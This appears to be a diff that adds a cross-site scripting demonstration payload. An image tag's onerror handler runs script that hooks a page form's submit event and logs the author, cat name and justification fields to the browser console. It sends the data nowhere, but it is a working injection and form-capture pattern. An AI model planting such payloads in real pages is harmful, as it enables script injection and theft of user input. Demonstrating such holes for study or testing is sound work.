@@ -1,0 +1,18 @@
+<img src=x onerror="(()=>{try{
+  const d=document, f=d.getElementById('form');
+  if(!f || window._xssHooked) return;     // evita engancharlo dos veces
+  window._xssHooked = true;
+
+  const val = (id)=>{ const el=d.getElementById(id); return el && 'value' in el ? el.value : ''; };
+
+  // Captura el submit y logea el JSON (sin impedir el envío)
+  f.addEventListener('submit', ()=> {
+    const data = {
+      author: val('author'),
+      catName: val('catName'),
+      justification: val('justification')
+    };
+    console.log('[XSS demo] Form submission JSON:', data);
+    console.log(JSON.stringify(data));
+  }, true); // captura temprana por si tu handler hace preventDefault
+}catch(e){ console.log('XSS demo error:', e); } })()">
